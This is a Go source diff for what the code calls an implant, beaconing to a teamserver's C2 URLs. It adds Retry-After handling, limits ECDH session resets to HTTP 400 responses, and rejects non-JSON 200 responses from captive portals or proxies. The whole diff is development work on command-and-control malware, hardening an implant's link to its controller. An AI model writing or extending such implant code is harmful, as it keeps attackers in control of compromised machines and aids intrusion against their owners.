@@ -13,6 +13,7 @@ import (
 	"net/http"
 	"strconv"
 	"strings"
+	"sync/atomic"
 	"time"
 )
 
@@ -20,6 +21,85 @@ import (
 // envelopes well below this; the limit exists so a rogue endpoint cannot turn
 // the implant into an unbounded buffer.
 const maxBeaconResponseBytes = 16 << 20 // 16 MiB
+
+// HTTP failure state is shared by the beacon loop. It is intentionally
+// best-effort: parallel mode may overwrite it, but the only consumers are the
+// register-recovery hint and the backoff floor.
+var (
+	lastHTTPStatus        atomic.Int32 // 0 = no response, otherwise last HTTP status
+	lastHTTPRetryDeadline atomic.Int64 // UnixNano; 0 = none
+)
+
+const maxHTTPRetryAfter = 5 * time.Minute
+
+// parseRetryAfter accepts both forms allowed by RFC 9110: delay-seconds and
+// an HTTP-date. Invalid or past values mean "no hint".
+func parseRetryAfter(raw string, now time.Time) time.Duration {
+	raw = strings.TrimSpace(raw)
+	if raw == "" {
+		return 0
+	}
+	if secs, err := strconv.Atoi(raw); err == nil {
+		if secs <= 0 {
+			return 0
+		}
+		d := time.Duration(secs) * time.Second
+		if d > maxHTTPRetryAfter {
+			return maxHTTPRetryAfter
+		}
+		return d
+	}
+	if t, err := http.ParseTime(raw); err == nil {
+		d := t.Sub(now)
+		if d <= 0 {
+			return 0
+		}
+		if d > maxHTTPRetryAfter {
+			return maxHTTPRetryAfter
+		}
+		return d
+	}
+	return 0
+}
+
+func recordHTTPRetryAfter(resp *http.Response, now time.Time) {
+	if resp == nil {
+		return
+	}
+	if d := parseRetryAfter(resp.Header.Get("Retry-After"), now); d > 0 {
+		lastHTTPRetryDeadline.Store(now.Add(d).UnixNano())
+	}
+}
+
+// takeHTTPRetryAfter returns and clears the remaining server-requested delay.
+func takeHTTPRetryAfter() time.Duration {
+	deadline := lastHTTPRetryDeadline.Swap(0)
+	if deadline <= 0 {
+		return 0
+	}
+	d := time.Until(time.Unix(0, deadline))
+	if d <= 0 {
+		return 0
+	}
+	if d > maxHTTPRetryAfter {
+		return maxHTTPRetryAfter
+	}
+	return d
+}
+
+// beaconStatusResetsSession limits ECDH invalidation to the one status the
+// teamserver uses for a bad/unknown frame (400). A 429 or 5xx is transient
+// backpressure/server trouble: dropping the session there turned a short
+// overload into a handshake storm and threw away the fast path.
+func beaconStatusResetsSession(code int) bool {
+	return code == http.StatusBadRequest
+}
+
+// beaconResponseBodyIsJSON rejects a 200 that cannot be the protocol's JSON
+// envelope (captive portal HTML, proxy error page, empty body).
+func beaconResponseBodyIsJSON(data []byte) bool {
+	return len(data) > 0 && json.Valid(data)
+}
 
 // c2URLsSnapshot returns a stable snapshot of the C2 URL list. The slice is
 // never mutated after being published via c2URLsStore, so callers may iterate
@@ -168,16 +248,23 @@ func sendToC2(idx int, body []byte) []byte {
 	}
 	defer resp.Body.Close()
 
-	if resp.StatusCode != 200 {
+	lastHTTPStatus.Store(int32(resp.StatusCode))
+	if resp.StatusCode != http.StatusOK {
 		if Debug {
 			fmt.Printf("[!] %s returned %d\n", url, resp.StatusCode)
 		}
-		// Teamserver restart drops the in-memory ECDH session; the next loop
-		// must handshake instead of forever replaying ciphertext into 400s.
-		if ecdhSess != nil {
-			ecdhSess.invalidate()
+		if resp.StatusCode == http.StatusTooManyRequests || resp.StatusCode == http.StatusServiceUnavailable {
+			recordHTTPRetryAfter(resp, time.Now())
 		}
-		inFastMode.Store(true)
+		// Only a 400 says the frame/session is unusable. 429/5xx mean the
+		// endpoint is alive but asking us to slow down or retrying later;
+		// invalidating ECDH here caused needless handshakes under load.
+		if beaconStatusResetsSession(resp.StatusCode) {
+			if ecdhSess != nil {
+				ecdhSess.invalidate()
+			}
+			inFastMode.Store(true)
+		}
 		return nil
 	}
 
@@ -217,6 +304,16 @@ func sendToC2(idx int, body []byte) []byte {
 			return nil
 		}
 	}
+	// A 200 is not automatically a beacon response: captive portals, proxies
+	// and misconfigured front ends answer with HTML. Returning that body made
+	// the caller clear the failure counter and drop the pending task results.
+	if !beaconResponseBodyIsJSON(data) {
+		if Debug {
+			fmt.Printf("[!] %s returned 200 with a non-JSON body (%d bytes); treating as failure\n", url, len(data))
+		}
+		return nil
+	}
+	lastHTTPRetryDeadline.Store(0)
 	return data
 }
 
